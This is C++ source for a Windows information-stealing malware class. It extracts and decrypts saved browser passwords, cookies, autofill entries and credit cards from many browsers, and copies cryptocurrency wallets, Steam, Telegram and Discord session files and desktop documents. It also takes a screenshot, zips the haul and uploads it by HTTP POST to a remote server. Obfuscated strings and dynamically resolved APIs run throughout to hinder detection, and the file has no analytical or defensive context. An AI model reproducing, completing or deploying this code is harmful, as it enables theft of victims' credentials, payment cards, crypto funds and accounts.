#include "Stealing.h"

void Stealing::WriteAllText(const string &file, const string &text, const string &mode)
{
	try
	{
		FILE *fFile = fopen(file.c_str(), mode.c_str());
		if (fFile == nullptr)
			return;
		fwrite(text.c_str(), sizeof(char), text.size(), fFile);
		fclose(fFile);
	}
	catch (...)
	{
		return;
	}
}

string Stealing::DecryptStr(BYTE *block)
{
	try
	{
		DATA_BLOB in;
		DATA_BLOB out;

		BYTE trick[1024];
		for (int i = 0; i < 1024; ++i)
			trick[i] = block[i];

		int size = sizeof(trick) / sizeof(trick[0]);

		in.pbData = (BYTE *)block;
		in.cbData = size + 1;
		char str[1024] = "";

		if ((FNC(CryptUnprotectData, XOR("Crypt32.dll"))(&in, 0, 0, 0, 0, 0, &out)))
		{
			for (int i = 0; i < out.cbData; ++i)
				str[i] = out.pbData[i];
			str[out.cbData] = '\0';

			return str;
		}
		else
		{
			return "";
		}
	}
	catch (...)
	{
		return (char *)"";
	}
}

void Stealing::CopyByMask(const string &path, const string &mask, const string &output, bool make_normal, bool second_lvl)
{
	try
	{
		WIN32_FIND_DATA data;
		HANDLE hFind = FNC(FindFirstFileA, XOR("Kernel32.dll"))((path + "\\" + mask).c_str(), &data);
		if (hFind != INVALID_HANDLE_VALUE)
		{
			do
			{
				const string file_name = data.cFileName;

				if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
					continue;

				File.Copy(path + "\\" + file_name, output + "\\" + file_name);
				if (make_normal)
					FNC(SetFileAttributesA, XOR("Kernel32.dll"))((output + "\\" + file_name).c_str(), FILE_ATTRIBUTE_NORMAL);
			} while (FNC(FindNextFileA, XOR("Kernel32.dll"))(hFind, &data));
		}

		FNC(FindClose, XOR("Kernel32.dll"))(hFind);

		if (second_lvl)
		{
			WIN32_FIND_DATA pData;
			HANDLE hFile = FNC(FindFirstFileA, XOR("Kernel32.dll"))((path + XOR("\\*")).c_str(), &pData);

			if (hFile != INVALID_HANDLE_VALUE)
			{
				do
				{
					const string file_name = pData.cFileName;
					if (file_name == "." || file_name == "..")
						continue;
					if (pData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
						CopyByMask(path + "\\" + file_name, mask, output);
				} while (FNC(FindNextFileA, XOR("Kernel32.dll"))(hFile, &pData));
			}

			FNC(FindClose, XOR("Kernel32.dll"))(hFile);
		}

		return;
	}
	catch (...)
	{
		return;
	}
}

bool Stealing::urlWriteFile(const string &server, const string &path, DWORD port, const string &file_path, const string &file_name)
{
	string file_name1 = XOR("file");
	string file_contents = "";

	FILE *file = fopen(file_path.c_str(), XOR("rb"));
	if (file == nullptr)
		return false;
	fseek(file, 0, SEEK_END);
	long len = ftell(file);
	char *ret = new char[len];
	fseek(file, 0, SEEK_SET);
	fread(ret, 1, len, file);
	fclose(file);

	for (int i = 0; i < len; ++i)
		file_contents += ret[i];

	delete[] ret;

	HINTERNET hInternet = InternetOpenA("", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

	if (hInternet != NULL)
	{
		HINTERNET hConnect = InternetConnect(hInternet, server.c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
		if (hConnect != NULL)
		{
			HINTERNET hRequest = NULL;

			if (port == INTERNET_DEFAULT_HTTP_PORT)
				hRequest = HttpOpenRequest(hConnect, XOR("POST"), path.c_str(),
										   NULL, NULL, 0, INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_PRAGMA_NOCACHE, 1);
			else
				hRequest = HttpOpenRequest(hConnect, XOR("POST"),
										   path.c_str(), NULL, NULL, 0, INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_SECURE, 1);

			if (hRequest != NULL)
			{
				string sOptional = XOR("-----------------------------7\r\n");
				sOptional += XOR("Content-Disposition: form-data; name=\"") + file_name1 + XOR("\"; filename=\"") + file_name + "\"\r\n";
				sOptional += XOR("Content-Type: application/octet-stream\r\n\r\n");
				sOptional += file_contents;
				sOptional += XOR("\r\n-----------------------------7--\r\n");

				string sHeaders = XOR("Content-Type: multipart/form-data; boundary=---------------------------7");

				BOOL bSend = HttpSendRequest(hRequest, sHeaders.c_str(),
											 sHeaders.size(), (LPVOID)sOptional.c_str(), sOptional.size());

				InternetCloseHandle(hRequest);
				return bSend;
			}
			InternetCloseHandle(hConnect);
		}
		InternetCloseHandle(hInternet);
	}
}

LONG Stealing::GetStringRegKeyA(HKEY hkey, const string &strValueName, string &output, const string &def_value)
{
	try
	{
		output = def_value;
		char szBuffer[512];
		DWORD dwBufferSize = sizeof(szBuffer);
		ULONG nError;
		nError = FNC(RegQueryValueExA, XOR("Advapi32.dll"))(hkey, strValueName.c_str(), 0, NULL, (LPBYTE)szBuffer, &dwBufferSize);
		if (ERROR_SUCCESS == nError)
			output = szBuffer;
		return nError;
	}
	catch (...)
	{
		output = def_value;
		return 0;
	}
}

PBITMAPINFO Stealing::CreateBitmapInfoStruct(HBITMAP hBmp)
{
	BITMAP bmp;
	PBITMAPINFO pbmi;
	WORD cClrBits;

	FNC(GetObjectA, XOR("Gdi32.dll"))(hBmp, sizeof(BITMAP), (LPSTR)&bmp);

	cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);
	if (cClrBits == 1)
		cClrBits = 1;
	else if (cClrBits <= 4)
		cClrBits = 4;
	else if (cClrBits <= 8)
		cClrBits = 8;
	else if (cClrBits <= 16)
		cClrBits = 16;
	else if (cClrBits <= 24)
		cClrBits = 24;
	else
		cClrBits = 32;

	if (cClrBits != 24)
		pbmi = (PBITMAPINFO)FNC(LocalAlloc, XOR("Kernel32.dll"))(LPTR, sizeof(BITMAPINFOHEADER) + sizeof(RGBQUAD) * (1 << cClrBits));
	else
		pbmi = (PBITMAPINFO)FNC(LocalAlloc, XOR("Kernel32.dll"))(LPTR, sizeof(BITMAPINFOHEADER));

	pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	pbmi->bmiHeader.biWidth = bmp.bmWidth;
	pbmi->bmiHeader.biHeight = bmp.bmHeight;
	pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
	pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;
	if (cClrBits < 24)
		pbmi->bmiHeader.biClrUsed = (1 << cClrBits);

	pbmi->bmiHeader.biCompression = BI_RGB;
	pbmi->bmiHeader.biSizeImage = ((pbmi->bmiHeader.biWidth * cClrBits + 31) & ~31) / 8 * pbmi->bmiHeader.biHeight;
	pbmi->bmiHeader.biClrImportant = 0;
	return pbmi;
}

void Stealing::CreateBMPFile(LPTSTR pszFile, PBITMAPINFO pbi, HBITMAP hBMP, HDC hDC)
{
	HANDLE hf;
	BITMAPFILEHEADER hdr;
	PBITMAPINFOHEADER pbih;
	LPBYTE lpBits;
	DWORD dwTotal;
	DWORD cb;
	BYTE *hp;
	DWORD dwTmp;

	pbih = (PBITMAPINFOHEADER)pbi;
	lpBits = (LPBYTE)FNC(GlobalAlloc, XOR("Kernel32.dll"))(GMEM_FIXED, pbih->biSizeImage);

	FNC(GetDIBits, XOR("Gdi32.dll"))(hDC, hBMP, 0, (WORD)pbih->biHeight, lpBits, pbi, DIB_RGB_COLORS);

	hf = FNC(CreateFileA, XOR("Kernel32.dll"))(pszFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	hdr.bfType = 0x4d42;
	hdr.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof(RGBQUAD) + pbih->biSizeImage);
	hdr.bfReserved1 = 0;
	hdr.bfReserved2 = 0;

	hdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof(RGBQUAD);
	FNC(WriteFile, XOR("Kernel32.dll"))(hf, (LPVOID)&hdr, sizeof(BITMAPFILEHEADER), (LPDWORD)&dwTmp, NULL);

	FNC(WriteFile, XOR("Kernel32.dll"))
	(hf, (LPVOID)pbih, sizeof(BITMAPINFOHEADER) + pbih->biClrUsed * sizeof(RGBQUAD), (LPDWORD)&dwTmp, NULL);

	dwTotal = cb = pbih->biSizeImage;
	hp = lpBits;
	FNC(WriteFile, XOR("Kernel32.dll"))(hf, (LPSTR)hp, (int)cb, (LPDWORD)&dwTmp, NULL);
	FNC(CloseHandle, XOR("Kernel32.dll"))(hf);

	FNC(GlobalFree, XOR("Kernel32.dll"))((HGLOBAL)lpBits);
}

void Stealing::__cpuid(int CPUInfo[4], int InfoType)
{
	try
	{
		__asm
		{
			mov    esi, CPUInfo
			mov    eax, InfoType
			xor    ecx, ecx
			cpuid
			mov    dword ptr[esi + 0], eax
			mov    dword ptr[esi + 4], ebx
			mov    dword ptr[esi + 8], ecx
			mov    dword ptr[esi + 12], edx
		}
	}
	catch (...)
	{
		return;
	}
}

void Stealing::GetCpu(string &output)
{
	try
	{
		int CPUInfo[4] = {-1};
		__cpuid(CPUInfo, 0x80000000);
		unsigned int nExIds = CPUInfo[0];

		char CPUBrandString[0x40] = {0};
		for (unsigned int i = 0x80000000; i <= nExIds; ++i)
		{
			__cpuid(CPUInfo, i);
			if (i == 0x80000002)
			{
				memcpy(CPUBrandString,
					   CPUInfo,
					   sizeof(CPUInfo));
			}
			else if (i == 0x80000003)
			{
				memcpy(CPUBrandString + 16,
					   CPUInfo,
					   sizeof(CPUInfo));
			}
			else if (i == 0x80000004)
			{
				memcpy(CPUBrandString + 32, CPUInfo, sizeof(CPUInfo));
			}
		}

		output = CPUBrandString;
	}
	catch (...)
	{
		return;
	}
}

const string Stealing::define_browser(const string &path)
{
	if (path.find(XOR("Google")) != string::npos)
		return XOR("Chrome");
	else if (path.find(XOR("Opera")) != string::npos)
		return XOR("Opera");
	else if (path.find(XOR("Kometa")) != string::npos)
		return XOR("Kometa");
	else if (path.find(XOR("Orbitum")) != string::npos)
		return XOR("Orbitum");
	else if (path.find(XOR("Comodo")) != string::npos)
		return XOR("Comodo");
	else if (path.find(XOR("Amigo")) != string::npos)
		return XOR("Amigo");
	else if (path.find(XOR("Torch")) != string::npos)
		return XOR("Torch");
	else if (path.find(XOR("Yandex")) != string::npos)
		return XOR("Yandex");
	else if (path.find(XOR("Chromium")) != string::npos)
		return XOR("Chromium");
	else if (path.find(XOR("360Chrome")) != string::npos)
		return XOR("360 Extreme");
	else if (path.find(XOR("Coc")) != string::npos)
		return XOR("Coc Coc");
	else if (path.find(XOR("Epic")) != string::npos)
		return XOR("Epic Browser");
	else if (path.find(XOR("Vivaldi")) != string::npos)
		return XOR("Vivaldi");
	else if (path.find(XOR("uCoz")) != string::npos)
		return XOR("Uran");
	else if (path.find(XOR("Sputnik")) != string::npos)
		return XOR("Sputnik");
	else if (path.find(XOR("Mozilla")) != string::npos)
		return XOR("Mozilla");
	return XOR("Unknown");
}

void Stealing::GetPasswords(const string &path)
{
	try
	{
		if (File.Exists(path))
		{
			sqlite3 *database;

			if (File.Exists(new_path))
				FNC(DeleteFileA, XorStr("Kernel32.dll"))(new_path.c_str());
			File.Copy(path, new_path);
			char *query = (char *)XOR("SELECT * FROM logins");
			if (sqlite3_open(new_path.c_str(), &database) == SQLITE_OK)
			{
				sqlite3_stmt *stmt;
				if (sqlite3_prepare_v2(database, query, -1, &stmt, 0) == SQLITE_OK)
				{
					string result = XOR("# ") + define_browser(path) + "\r\n";

					while (sqlite3_step(stmt) == SQLITE_ROW)
					{
						const string pass = DecryptStr((BYTE *)sqlite3_column_blob(stmt, 5));
						if (pass != "")
						{
							result += XOR("--------------\r\n");
							result += XOR("Url: ") + (string)(char *)sqlite3_column_text(stmt, 1) + "\r\n";
							result += XOR("Login: ") + (string)(char *)sqlite3_column_text(stmt, 3) + "\r\n";
							result += XOR("Password: ") + pass + "\r\n";
							++passwords;
						}
					}

					WriteAllText(this->passPath, result);
					sqlite3_finalize(stmt);
					sqlite3_close(database);
				}
			}
		}
	}
	catch (...)
	{
		return;
	}
}

void Stealing::GetCookies(const string &path)
{
	try
	{
		if (File.Exists(path))
		{
			sqlite3 *database;

			if (File.Exists(new_path))
				FNC(DeleteFileA, XorStr("Kernel32.dll"))(new_path.c_str());
			File.Copy(path, new_path);

			char *query = (char *)XOR("SELECT * FROM cookies");
			if (sqlite3_open(new_path.c_str(), &database) == SQLITE_OK)
			{
				sqlite3_stmt *stmt;
				if (sqlite3_prepare_v2(database, query, -1, &stmt, 0) == SQLITE_OK)
				{
					string output = XOR("# ") + define_browser(path) + "\r\n";

					while (sqlite3_step(stmt) == SQLITE_ROW)
					{
						const string cookie_key = DecryptStr((BYTE *)sqlite3_column_blob(stmt, 12));
						if (cookie_key != "")
						{
							output += (string)(const char *)sqlite3_column_text(stmt, 1) /* host key */ + XOR("\tFALSE\t") +
									  (string)(const char *)sqlite3_column_text(stmt, 4) /* path */ + '\t';
							const string secure = (const char *)sqlite3_column_text(stmt, 6); /* secure to upper */
							string secure_upped = "";
							for (auto &ch : secure)
								secure_upped += (char)toupper((int)ch);
							output += secure_upped + '\t' + (string)(const char *)sqlite3_column_text(stmt, 5) /* expires_uts*/
									  + '\t' + (string)(const char *)sqlite3_column_text(stmt, 2)			   /* name */
									  + '\t' + cookie_key + "\r\n";
							++cookies;
						}
					}

					WriteAllText(cookiePath, output);
					sqlite3_finalize(stmt);
					sqlite3_close(database);
				}
			}
		}
	}
	catch (...)
	{
		return;
	}
}

void Stealing::GetForms(const string &path)
{
	try
	{
		if (File.Exists(path))
		{
			if (File.Exists(new_path))
				FNC(DeleteFileA, XorStr("Kernel32.dll"))(new_path.c_str());
			File.Copy(path, new_path);

			sqlite3 *database;

			char *query = (char *)XOR("SELECT * FROM autofill");
			if (sqlite3_open(new_path.c_str(), &database) == SQLITE_OK)
			{
				sqlite3_stmt *stmt;
				if (sqlite3_prepare_v2(database, query, -1, &stmt, 0) == SQLITE_OK)
				{
					string result = XOR("# ") + define_browser(path) + "\r\n";

					while (sqlite3_step(stmt) == SQLITE_ROW)
					{
						const string form_value = (string)(char *)sqlite3_column_text(stmt, 1);
						if (form_value != "")
						{
							result += XOR("--------------\r\n");
							result += XOR("Form name: ") + (string)(char *)sqlite3_column_text(stmt, 0) + "\r\n";
							result += XOR("Form value: ") + form_value + "\r\n";
							++forms;
						}
					}

					WriteAllText(formPath, result);
					sqlite3_finalize(stmt);
					sqlite3_close(database);
				}
			}
		}
	}
	catch (...)
	{
		return;
	}
}

void Stealing::GetCards(const string &path)
{
	try
	{
		if (File.Exists(path))
		{
			sqlite3 *database;

			if (File.Exists(new_path))
				FNC(DeleteFileA, XorStr("Kernel32.dll"))(new_path.c_str());
			File.Copy(path, new_path);

			char *query = (char *)XOR("SELECT * FROM credit_cards");
			if (sqlite3_open(new_path.c_str(), &database) == SQLITE_OK)
			{
				sqlite3_stmt *stmt;
				if (sqlite3_prepare_v2(database, query, -1, &stmt, 0) == SQLITE_OK)
				{
					string result = XOR("# ") + define_browser(path) + "\r\n";

					while (sqlite3_step(stmt) == SQLITE_ROW)
					{
						const string card_num = (string)DecryptStr((BYTE *)sqlite3_column_blob(stmt, 4));
						if (card_num != "")
						{
							result += XOR("--------------\r\n");
							result += XOR("Name: ") + (string)(char *)sqlite3_column_text(stmt, 1) + "\r\n";
							result += XOR("Month: ") + (string)(char *)sqlite3_column_text(stmt, 2) + "\r\n";
							result += XOR("Year: ") + (string)(char *)sqlite3_column_text(stmt, 3) + "\r\n";
							result += XOR("Card number: ") + card_num + "\r\n";
							result += XOR("Billing number: ") + (string)(char *)sqlite3_column_text(stmt, 9) + "\r\n";
							++cards;
						}
					}

					WriteAllText(cardPath, result);
					sqlite3_close(database);
					sqlite3_finalize(stmt);
				}
			}
		}
	}
	catch (...)
	{
		return;
	}
}

void Stealing::GetFormsGecko(const string &path)
{
	try
	{
		if (File.Exists(path))
		{
			if (File.Exists(new_path))
				FNC(DeleteFileA, XorStr("Kernel32.dll"))(new_path.c_str());
			File.Copy(path, new_path);

			sqlite3 *database;

			char *query = (char *)XOR("SELECT * FROM moz_formhistory");
			if (sqlite3_open(new_path.c_str(), &database) == SQLITE_OK)
			{
				sqlite3_stmt *stmt;
				if (sqlite3_prepare_v2(database, query, -1, &stmt, 0) == SQLITE_OK)
				{
					string result = XOR("# ") + define_browser(path) + "\r\n";

					while (sqlite3_step(stmt) == SQLITE_ROW)
					{
						const string form_value = (string)(char *)sqlite3_column_text(stmt, 2);
						if (form_value != "")
						{
							result += XOR("--------------\r\n");
							result += XOR("Form name: ") + (string)(char *)sqlite3_column_text(stmt, 1) + "\r\n";
							result += XOR("Form value: ") + form_value + "\r\n";
							++forms;
						}
					}

					WriteAllText(formPath, result);
					sqlite3_finalize(stmt);
					sqlite3_close(database);
				}
			}
		}
	}
	catch (...)
	{
		return;
	}
}

void Stealing::GetWalletsReg(const string &output_dir)
{
	string wallet_path = "";

	// BitCoin
	HKEY key1;

	FNC(RegOpenKeyA, XOR("Advapi32.dll"))(HKEY_CURRENT_USER, XOR("Software\\Bitcoin\\Bitcoin-Qt"), &key1);
	GetStringRegKeyA(key1, XOR("strDataDir"), wallet_path, XOR("ERR"));
	if (wallet_path != XOR("ERR"))
		File.Copy(wallet_path + XOR("\\wallet.dat"), output_dir + XOR("\\bitcoin.dat"));
	// END
	wallet_path = "";

	// LITECOIN
	HKEY key2;
	FNC(RegOpenKeyA, XOR("Advapi32.dll"))(HKEY_CURRENT_USER, XOR("Software\\Litecoin\\Litecoin-Qt"), &key2);
	GetStringRegKeyA(key2, XOR("strDataDir"), wallet_path, XOR("ERR"));
	if (wallet_path != XOR("ERR"))
		File.Copy(wallet_path + XOR("\\wallet.dat"), output_dir + XOR("\\litecoin.dat"));
	// END
	wallet_path = "";

	// DASHCOIN
	HKEY key3;
	FNC(RegOpenKeyA, XOR("Advapi32.dll"))(HKEY_CURRENT_USER, XOR("Software\\Dash\\Dash-Qt"), &key3);
	GetStringRegKeyA(key3, XOR("strDataDir"), wallet_path, XOR("ERR"));
	if (wallet_path != XOR("ERR"))
		File.Copy(wallet_path + XOR("\\wallet.dat"), output_dir + XOR("\\dashcoin.dat"));
	// END
	wallet_path = "";

	// MONERO
	HKEY key4;
	FNC(RegOpenKeyA, XOR("Advapi32.dll"))(HKEY_CURRENT_USER, XOR("Software\\monero-project\\monero-core"), &key4);
	GetStringRegKeyA(key4, XOR("wallet_path"), wallet_path, XOR("ERR"));
	if (wallet_path != XOR("ERR"))
	{
		for (int i = 0; i < (int)wallet_path.size(); ++i)
			if (wallet_path[i] == '/')
				wallet_path[i] = '\\';

		string result = "";
		for (int i = (int)wallet_path.size() - 1; i >= 0; --i)
			if (wallet_path[i] == '\\')
			{
				result = wallet_path.substr(i + 1, wallet_path.size() - 1);
				break;
			}
		File.Copy(wallet_path, output_dir + "\\" + result);
	}

	WIN32_FIND_DATA data;
	HANDLE hFile = FNC(FindFirstFileA, XOR("Kernel32.dll"))((output_dir + XOR("\\*")).c_str(), &data);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			if (!(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			{
				bWallets = true;
				FNC(FindClose, XOR("Kernel32.dll"))(hFile);
				return;
			}
		} while (FNC(FindNextFileA, XOR("Kernel32.dll"))(hFile, &data));
	}

	FNC(FindClose, XOR("Kernel32.dll"))(hFile);
	File.dirInstance()->Delete(output_dir, false);
	// END
	return;
}

void Stealing::GetWalletsPath(const string &output_dir)
{
	const string appdata_path = (string)getenv("appdata");
	CopyByMask(appdata_path + XOR("\\Electrum\\wallets"), XOR("*"), output_dir, true);
	CopyByMask(appdata_path + XOR("\\Ethereum\\keystore"), XOR("*"), output_dir, true);
	CopyByMask(appdata_path + XOR("\\bytecoin"), XOR("*.wallet"), output_dir, true);

	WIN32_FIND_DATA data;
	HANDLE hFiles = FNC(FindFirstFileA, XOR("Kernel32.dll"))((output_dir + "\\*").c_str(), &data);

	if (hFiles != INVALID_HANDLE_VALUE)
	{
		do
		{
			if (!(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			{
				bWallets = true;
				FNC(FindClose, XOR("Kernel32.dll"))(hFiles);
				return;
			}
		} while (FNC(FindNextFileA, XOR("Kernel32.dll"))(hFiles, &data));
	}

	FNC(FindClose, XOR("Kernel32.dll"))(hFiles);
	File.dirInstance()->Delete(output_dir);
}

void Stealing::GetDesktopFiles(const string &output_dir)
{
	try
	{
		string desktop_path = XOR("C:\\Users\\") + File.getUserName() + XOR("\\Desktop");

		CopyByMask(desktop_path, XOR("*.txt"), output_dir, false, true);
		CopyByMask(desktop_path, XOR("*.doc"), output_dir, false, true);
		CopyByMask(desktop_path, XOR("*.docx"), output_dir, false, true);
		CopyByMask(desktop_path, XOR("*.log"), output_dir, false, true);

		WIN32_FIND_DATA data;
		HANDLE hFile = FNC(FindFirstFileA, XOR("Kernel32.dll"))((output_dir + XOR("\\*")).c_str(), &data);

		if (hFile != INVALID_HANDLE_VALUE)
		{
			do
			{
				if (!(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
				{
					FNC(FindClose, XOR("Kernel32.dll"))(hFile);
					return;
				}
			} while (FNC(FindNextFileA, XOR("Kernel32.dll"))(hFile, &data));
		}

		FNC(FindClose, XOR("Kernel32.dll"))(hFile);
		File.dirInstance()->Delete(output_dir, false);
	}
	catch (...)
	{
		return;
	}
}

void Stealing::GetSteam(const string &output_dir)
{
	try
	{
		HKEY key;
		FNC(RegOpenKeyA, XOR("Advapi32.dll"))(HKEY_CURRENT_USER, XOR("Software\\Valve\\Steam"), &key);

		string SteamPath = "";
		GetStringRegKeyA(key, XOR("SteamPath"), SteamPath, XOR("NON"));

		if (SteamPath == XOR("NON"))
		{
			File.dirInstance()->Delete(output_dir, false);
			return;
		}

		CopyByMask(SteamPath, XOR("ssfn*"), output_dir, true);

		WIN32_FIND_DATA data;
		HANDLE hConfig = FNC(FindFirstFileA, XOR("Kernel32.dll"))((SteamPath + XOR("\\config\\*.vdf")).c_str(), &data);
		if (hConfig == INVALID_HANDLE_VALUE)
		{
			FNC(FindClose, XOR("Kernel32.dll"))(hConfig);
			return;
		}
		else
		{
			do
			{
				if ((int)strlen(data.cFileName) <= 18)
					File.Copy(SteamPath + XOR("\\config\\") + data.cFileName, output_dir + "\\" + data.cFileName);
			} while (FNC(FindNextFileA, XOR("Kernel32.dll"))(hConfig, &data));
			FNC(FindClose, XOR("Kernel32.dll"))(hConfig);
		}
		bSteam = true;
	}
	catch (...)
	{
		return;
	}
}

void Stealing::GetTelegram(const string &output_dir)
{
	try
	{
		string teleg_path = (string)getenv(XOR("AppData")) + XOR("\\Telegram Desktop\\tdata");
		if (!File.dirInstance()->Exists(teleg_path))
		{
			File.dirInstance()->Delete(output_dir);
			return;
		}
		CopyByMask(teleg_path, XOR("D877F783D5D3EF8C*"), output_dir);
		teleg_path += (string)XOR("\\D877F783D5D3EF8C");
		CopyByMask(teleg_path, XOR("map*"), output_dir);

		WIN32_FIND_DATA data;
		HANDLE hFile = FNC(FindFirstFileA, XOR("Kernel32.dll"))((output_dir + XOR("\\*")).c_str(), &data);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			do
			{
				if (!(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
				{
					bTeleg = true;
					break;
				}
			} while (FNC(FindNextFileA, XOR("Kernel32.dll"))(hFile, &data));
		}

		FNC(FindClose, XOR("Kernel32.dll"))(hFile);
		if (!bTeleg)
			File.dirInstance()->Delete(output_dir);
	}
	catch (...)
	{
		return;
	}
}

void Stealing::GetDiscord(const string &output_dir)
{
	try
	{
		const string discord_path = (string)getenv(XOR("appdata")) + XOR("\\discord\\Local Storage");
		CopyByMask(discord_path, XOR("https_discordapp.com*.localstorage"), output_dir);

		WIN32_FIND_DATA data;
		HANDLE hFile = FNC(FindFirstFileA, XOR("Kernel32.dll"))((output_dir + XOR("\\*.localstorage")).c_str(), &data);

		if (hFile == INVALID_HANDLE_VALUE)
			File.dirInstance()->Delete(output_dir);

		FNC(FindClose, XOR("Kernel32.dll"))(hFile);
	}
	catch (...)
	{
		return;
	}
}

void Stealing::GetInformation(const string &output_path)
{
	try
	{
		string information = (string)VERSION;
		information += "\r\n";

		information += XOR("User name: ") + File.getUserName() + "\r\n";
		information += XOR("Startup folder: ") + File.ExePath() + "\r\n";

		string cpu_brand = "";
		GetCpu(cpu_brand);

		information += XOR("CPU info: ") + cpu_brand + "\r\n";

		DISPLAY_DEVICEA dd;
		dd.cb = sizeof(DISPLAY_DEVICEA);
		FNC(EnumDisplayDevicesA, XOR("User32.dll"))(NULL, 0, &dd, EDD_GET_DEVICE_INTERFACE_NAME);
		information += XOR("GPU card: ") + string(dd.DeviceString) + "\r\n";

		WriteAllText(output_path, information, "w");
	}
	catch (...)
	{
		return;
	}
}

void Stealing::GetScreenShot(const string &output_path)
{
	try
	{
		int sx = FNC(GetSystemMetrics, XOR("User32.dll"))(SM_CXSCREEN),
			sy = FNC(GetSystemMetrics, XOR("User32.dll"))(SM_CYSCREEN);
		HDC hDC = FNC(GetDC, XOR("User32.dll"))(FNC(GetDesktopWindow, XOR("User32.dll"))());
		HDC MyHDC = FNC(CreateCompatibleDC, XOR("Gdi32.dll"))(hDC);
		HBITMAP hBMP = FNC(CreateCompatibleBitmap, XOR("Gdi32.dll"))(hDC, sx, sy);
		FNC(SelectObject, XOR("Gdi32.dll"))(MyHDC, hBMP);
		LOGBRUSH MyBrush;
		MyBrush.lbStyle = BS_SOLID;
		MyBrush.lbColor = 0xFF0000;
		HBRUSH hBrush = FNC(CreateBrushIndirect, XOR("Gdi32.dll"))(&MyBrush);
		RECT MyRect = {0, 0, sx, sy};
		FNC(FillRect, XOR("User32.dll"))(MyHDC, &MyRect, hBrush);

		FNC(BitBlt, XOR("Gdi32.dll"))(MyHDC, 0, 0, sx, sy, hDC, 0, 0, SRCCOPY);
		CreateBMPFile(LPTSTR(output_path.c_str()), CreateBitmapInfoStruct(hBMP), hBMP, MyHDC);
	}
	catch (...)
	{
		return;
	}
}

void Stealing::ZipFolder(const string &path, const string &output_path)
{
	try
	{
		HZIP hZip = CreateZip(output_path.c_str(), 0);

		WIN32_FIND_DATA data;
		HANDLE hFolder = FNC(FindFirstFileA, XOR("Kernel32.dll"))((path + "\\*").c_str(), &data);

		if (hFolder != INVALID_HANDLE_VALUE)
		{
			do
			{
				const string cur_file = data.cFileName;
				if (cur_file == "." || cur_file == "..")
					continue;
				if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					ZipAddFolder(hZip, data.cFileName);

					WIN32_FIND_DATA subdir_data;
					HANDLE hSubDir = FNC(FindFirstFileA, XOR("Kernel32.dll"))((path + "\\" + data.cFileName + "\\*").c_str(), &subdir_data);
					do
					{
						if (subdir_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
							continue;

						ZipAdd(hZip, ((string)data.cFileName + "\\" + subdir_data.cFileName).c_str(), (path + "\\" + data.cFileName + "\\" + subdir_data.cFileName).c_str());

					} while (FNC(FindNextFileA, XOR("Kernel32.dll"))(hSubDir, &subdir_data));
					FNC(FindClose, XOR("Kernel32.dll"))(hSubDir);
				}
				else
					ZipAdd(hZip, data.cFileName, (path + "\\" + data.cFileName).c_str());
			} while (FNC(FindNextFileA, XOR("Kernel32.dll"))(hFolder, &data));

			CloseZip(hZip);
			FNC(FindClose, XOR("Kernel32.dll"))(hFolder);
		}
	}
	catch (...)
	{
		return;
	}
}

void Stealing::Release(const string &first, const string &url, const string &zip_path, const string &output_fileName)
{
	this->urlWriteFile(first, url, INTERNET_DEFAULT_HTTP_PORT, zip_path, output_fileName);
}